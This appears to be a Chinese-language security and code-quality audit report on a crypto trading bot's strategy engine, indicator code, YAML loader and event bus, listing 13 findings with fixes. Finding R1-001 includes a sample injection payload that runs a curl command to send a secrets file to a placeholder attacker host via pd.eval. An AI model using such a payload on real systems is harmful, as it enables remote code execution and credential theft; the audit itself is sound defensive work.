# 审计报告 R1 — Strategy Engine + Indicators + Event Bus

**日期**: 2026-07-16
**审查文件**: `core/strategy/indicators.py`, `core/strategy/engine.py`, `core/strategy/loader.py`, `app/event_bus.py`
**审查代码行数**: ~1100 行
**审计方法**: 逐行静态审查 + 数据流追踪 + 逻辑正确性验证

---

## 摘要

| 等级 | 数量 |
|------|------|
| Critical | 1 |
| High | 4 |
| Medium | 5 |
| Low | 3 |
| **总计** | **13** |

---

## 漏洞清单

| ID | 等级 | 文件:行 | 描述 |
|----|------|---------|------|
| R1-001 | **Critical** | indicators.py:134 | `pd.eval()` 代码注入 — 条件表达式可执行任意 Python 代码 |
| R1-002 | High | indicators.py:51,102-105,108,119 | 多处除零无保护 — bollinger_width, volume_ratio, atr_ratio |
| R1-003 | High | engine.py:166-198 | 多时间框架趋势对齐中硬编码 Magic Number 且 `_TF_MIN` 映射不完整 |
| R1-004 | High | engine.py:288-289 | Reduce counter key 不含 strategy name — 跨策略干扰风险 |
| R1-005 | High | engine.py:393-394 | `evaluate_all_now()` 直接访问私有属性 `_watched_symbols` |
| R1-006 | Medium | engine.py:118-125 | 多空信号同时活跃时静默丢弃 (indicator_signal=0) — 无日志/告警 |
| R1-007 | Medium | engine.py:200-214 | Exit signal 处理在 executor 为 None 时静默忽略 |
| R1-008 | Medium | event_bus.py:57,70 | 队列满时阻塞所有生产者 + 事件顺序处理瓶颈 |
| R1-009 | Medium | event_bus.py:47-50 | `subscribe_all()` 使高频事件触发所有告警规则评估 |
| R1-010 | Medium | loader.py:61-69 | `load_all()` 单个 YAML 错误导致全部策略加载失败 |
| R1-011 | Low | indicators.py:87-90 | STOCH 指标的 slowk_period/slowd_period 硬编码为3 |
| R1-012 | Low | indicators.py:93 | OBV SMA 周期硬编码为20，忽略用户配置 |
| R1-013 | Low | loader.py:71-75 | `save()` 无同名文件冲突检测 — 静默覆盖 |

---

## 详细分析

### R1-001 🔴 Critical — `pd.eval()` 代码注入

**文件**: `core/strategy/indicators.py:134`

```python
result = pd.eval(condition, engine="python", local_dict=env)
```

**描述**: `pd.eval()` 使用 `engine="python"` 时，底层调用 Python 的 `eval()` 执行表达式。策略条件（如 `"rsi < 30 AND adx > 20"`）作为字符串传入并被求值。虽然策略 YAML 文件使用 `yaml.safe_load()` 解析，但如果攻击者能够通过以下途径注入恶意条件字符串：

1. **Web UI 策略编辑器** — 如果策略保存接口未充分验证条件表达式
2. **文件系统写入** — 直接修改 `strategies/` 目录下的 YAML 文件

恶意条件示例：
```yaml
entry_conditions:
  long:
    - "__import__('os').system('curl http://attacker.com/$(cat config/secrets.yaml)')"
```

由于 `local_dict=env` 中包含了 DataFrame 列名的引用（如 `rsi`, `close`, `volume`），`pd.eval` 会先尝试在 `env` 中查找变量。但 Python engine 仍允许访问 builtins 和执行任意表达式。

**复现路径**:
1. 通过 Web UI 创建新策略，在入场条件中输入恶意表达式
2. 策略被保存到 YAML 文件
3. 下一次 K 线到达时，`strategy._evaluate()` → `compute_all()` → `evaluate_condition()` 执行恶意代码

**修复建议**:
- 使用 `engine="numexpr"` 替代 `engine="python"`（numexpr 仅支持数学运算，无代码执行能力）
- 或实现白名单 AST 解析器，仅允许已知的列名、比较运算符和逻辑运算符
- 在 Web UI 的策略保存端点添加条件表达式验证

---

### R1-002 🟠 High — 多处除零无保护

**文件**: `core/strategy/indicators.py:51,102-105,108,119`

**位置1** (line 51):
```python
result["bollinger_width"] = (upper - lower) / middle
```
若 `middle`（布林带中轨）为0 → `ZeroDivisionError`。虽然正常行情中不太可能，但某些极端场景（如稳定币对、价格极低的代币）可能出现。

**位置2** (lines 102-105):
```python
result["volume_ratio"] = result["volume"] / result["volume_sma"]
```
新币种或数据不足时，20日均量可能为0。

**位置3** (line 119):
```python
result["atr_ratio"] = result["atr"] / result["close"]
```
若 close 价格为0（理论场景但也应防护）。

**位置4** (line 108):
```python
result["bollinger_width_sma"] = result["bollinger_width"].rolling(20).mean()
```
这不涉及除法，但若 bollinger_width 因除零而产生 inf/nan，会传播到此处。

**复现路径**: 使用价格极低或交易量为0的交易对，触发 compute_all()。

**修复建议**:
```python
middle_safe = middle.replace(0, np.nan)
result["bollinger_width"] = (upper - lower) / middle_safe
```

---

### R1-003 🟠 High — 多时间框架趋势对齐硬编码

**文件**: `core/strategy/engine.py:166-198`

**问题1**: `_TF_MIN` 映射硬编码：
```python
_TF_MIN = {"1m":1,"3m":3,"5m":5,"15m":15,"30m":30,"1h":60,"2h":120,"4h":240,"6h":360,"8h":480,"12h":720,"1d":1440}
```
如果配置文件中使用了 `"3m"`, `"30m"`, `"6h"` 等非标准时间框架，`_TF_MIN.get(interval, 60)` 会默认返回60（1小时），导致时间框架比较错误。

**问题2**: 趋势偏差阈值硬编码为 2%（`deviation > -0.02`）：
```python
elif deviation > -0.02:  # within 2% below EMA
    mult = 0.6
else:
    mult = 0.0  # extreme counter-trend — block completely
```
2% 的阈值对 BTC 可能合理，但对高波动小币种可能过于严格（频繁阻止入场）。

**复现路径**: 使用非标准时间框架（如 "3m", "6h"）的策略 → 高时间框架趋势判断使用错误的 interval key → 趋势对齐被错误计算。

**修复建议**:
- 使用集中的 `_TIMEFRAME_MINUTES` 常量（回测引擎中已有一份）
- 偏差阈值应可配置，或基于 ATR 动态计算

---

### R1-004 🟠 High — Reduce counter key 不含策略名

**文件**: `core/strategy/engine.py:288-289`

```python
reduce_key = f"reduce_count_{symbol}_{side}"
```

此 key 仅包含 symbol 和 side，不包含 strategy name。虽然第283-284行检查了 `pos_strategy == strategy.name` 确保只有开启仓位的策略才能管理仓位，但存在以下场景：

1. 策略 A 开仓 BTC long，减仓2次后 `reduce_count = 2`
2. 策略 A 被关闭/删除，策略 B 接管该仓位（如果策略名改变）
3. reduce counter 残留，可能限制策略 B 的减仓操作

**复现路径**: 策略更名或切换后，同一 symbol+side 的 reduce counter 未重置。

**修复建议**:
```python
reduce_key = f"reduce_count_{strategy.name}_{symbol}_{side}"
```

---

### R1-005 🟠 High — 访问私有属性

**文件**: `core/strategy/engine.py:393-394`

```python
effective_symbols = strategy.symbols if strategy.symbols else self.market_data._watched_symbols
```

直接访问 `_watched_symbols`（以下划线开头的约定私有属性）。如果 `MarketDataProvider` 重构内部实现（如将 `_watched_symbols` 改名为 `_symbols`），`evaluate_all_now()` 将在运行时静默失败（因为会抛出 AttributeError，但被 404行的 bare except 吞没）。

**复现路径**: 重构 MarketDataProvider 内部实现 → evaluate_all_now() 因 AttributeError 被静默吞没 → 策略评估静默失败。

**修复建议**: 使用公共接口 `market_data.watched_symbols` property。

---

### R1-006 🟡 Medium — 多空信号冲突静默丢弃

**文件**: `core/strategy/engine.py:118-125`

```python
if long_active and short_active:
    indicator_signal = 0.0
```

当同一策略的 long 和 short 条件同时满足时（例如："rsi < 30" AND "rsi > 70" 不可能同时成立，但 "rsi < 35" AND "macd bearish crossover" 可能），信号被静默设为 0。这本身是合理的防御逻辑，但存在两个问题：

1. **无日志或告警** — 策略设计者不知道自己的条件存在冲突
2. **信号缓存仍然更新** — `_signal_cache[key]` 记录了 indicator_signal=0，但在 Web UI 中显示为 "no signal"，缺乏对冲突的诊断信息

**复现路径**: 设计含矛盾条件的策略 → 冲突时无反馈 → 策略设计者困惑。

**修复建议**: 当冲突发生时记录 WARNING 日志并在 signal cache 中增加 `conflict: true` 标记。

---

### R1-007 🟡 Medium — Exit signal 在无 executor 时静默忽略

**文件**: `core/strategy/engine.py:200-202`

```python
has_position = self._executor and symbol in self._executor.get_open_positions()
```

如果 `self._executor` 为 None（例如在回测引擎直接调用 `evaluate_sync()` 的场景），`has_position` 始终为 False。这意味着：

- Exit 信号永远不会阻止入场
- 但实际上 exit 信号的语义是 "当前持仓应该退出"，与是否阻止入场是两件事

**复现路径**: `evaluate_sync()` 被回测引擎调用，不经过 executor → exit 信号被忽略。

**修复建议**: 将 `has_position` 作为参数传入 `_evaluate()`，或使用单独的 position tracker。

---

### R1-008 🟡 Medium — EventBus 队列阻塞

**文件**: `app/event_bus.py:57,68-70`

**问题1** (line 57): `await self._queue.put(event)` — asyncio.Queue 在 maxsize=10000 满时会阻塞生产者。如果 `_process()` 处理慢（例如因 AI 调用或其他 I/O），所有事件生产者（WebSocket handler, REST polling, position guard）都会被阻塞。这是级联故障的潜在起点。

**问题2** (lines 68-70):
```python
tasks = [cb(event) for cb in subscribers]
if tasks:
    await asyncio.gather(*tasks, return_exceptions=True)
```
所有订阅者并发执行（好的），但整个事件处理是顺序的（事件1的所有订阅者完成后才处理事件2）。如果一个订阅者执行慢（5秒+），后续所有事件处理延迟5秒。

**复现路径**: 高频行情期间，若某个 subscriber 执行缓慢 → 事件队列积压 → 生产者阻塞 → 整个系统延迟增大。

**修复建议**:
- 将 `_queue.put()` 改为 `_queue.put_nowait()` + 溢出处理（丢弃最旧事件或记录告警）
- 为 subscriber 回调设置超时（`asyncio.wait_for`）

---

### R1-009 🟡 Medium — subscribe_all 导致高频事件触发告警

**文件**: `app/event_bus.py:47-50`

```python
def subscribe_all(self, callback: Callable[[Event], Awaitable[None]]):
    for event_type in EventType:
        self._subscribers[event_type].append(callback)
```

AlertManager 使用 `subscribe_all()` 注册 `_on_any_event` 回调。这意味着每次 `MARKET_KLINE` 事件（每秒多次，来自5个symbol × 5个interval = 25个stream）都会触发告警规则评估。虽然 AlertRule 有 cooldown 机制，但规则评估本身的开销（遍历所有规则、字符串匹配）在高频事件下不可忽视。

**复现路径**: 运行一段时间后，CPU 在告警规则评估上消耗显著。

**修复建议**: 将高频事件（MARKET_KLINE, MARKET_TICK）从 subscribe_all 中排除，AlertManager 改为订阅特定关注的事件类型。

---

### R1-010 🟡 Medium — load_all() 单文件失败导致全量加载失败

**文件**: `core/strategy/loader.py:61-69`

```python
for path in self.strategies_dir.glob("*.yaml"):
    with open(path, encoding="utf-8") as f:
        data = yaml.safe_load(f)
    strategies.append(StrategyConfig(**data))
```

如果 strategies/ 目录中有10个策略文件，其中1个 YAML 格式错误或缺少必填字段，`StrategyConfig(**data)` 会抛出 `ValidationError`，导致**全部10个策略加载失败**（因为 exception 向上传播到 `start()` 方法）。

**复现路径**: 通过 Web UI 创建/编辑策略时写入不完整数据 → 重启后策略引擎启动失败 → 0个策略运行。

**修复建议**: 在循环内添加 try/except，跳过错误文件并记录日志。

---

### R1-011 🟢 Low — STOCH 参数硬编码

**文件**: `core/strategy/indicators.py:87-90`

```python
slowk, slowd = talib.STOCH(
    result["high"].values, result["low"].values, result["close"].values,
    fastk_period=period, slowk_period=3, slowd_period=3
)
```

`slowk_period=3` 和 `slowd_period=3` 被硬编码。用户的 YAML 配置中可能指定了 `stoch_k_period` 和 `stoch_d_period`，但这些值被忽略。

**修复建议**: 从 `cfg` 中读取 `slowk_period` 和 `slowd_period`：
```python
slowk = _safe_int(cfg.get("slowk_period", 3), 3)
slowd = _safe_int(cfg.get("slowd_period", 3), 3)
```

---

### R1-012 🟢 Low — OBV SMA 周期硬编码

**文件**: `core/strategy/indicators.py:93`

```python
result["obv_sma"] = result["obv"].rolling(20).mean()
```

OBV 指标的 SMA 周期硬编码为20，忽略了用户在 `period` 字段中配置的值（第26行已解析）。

**修复建议**: 使用 `period` 变量：
```python
result["obv_sma"] = result["obv"].rolling(period).mean()
```

---

### R1-013 🟢 Low — 策略保存无同名冲突检测

**文件**: `core/strategy/loader.py:71-75`

```python
def save(self, config: StrategyConfig):
    path = self.strategies_dir / f"{self._normalize(config.name)}.yaml"
    with open(path, "w", encoding="utf-8") as f:
        yaml.dump(config.model_dump(), f, ...)
```

如果两个不同名的策略归一化后文件名相同（例如 "My Strategy" 和 "my_strategy" 都归一化为 `my_strategy.yaml`），后保存的会静默覆盖先保存的。

**复现路径**: 创建 "My Strategy" → 创建 "my_strategy" → 第一个策略被覆盖丢失。

**修复建议**: 如果文件已存在且源策略名不同，发出警告或自动重命名。

---

## 累计统计

（本报告为首轮审计，累计统计与摘要相同。）

| 等级 | R1 | 累计 |
|------|-----|------|
| Critical | 1 | 1 |
| High | 4 | 4 |
| Medium | 5 | 5 |
| Low | 3 | 3 |
| **总计** | **13** | **13** |
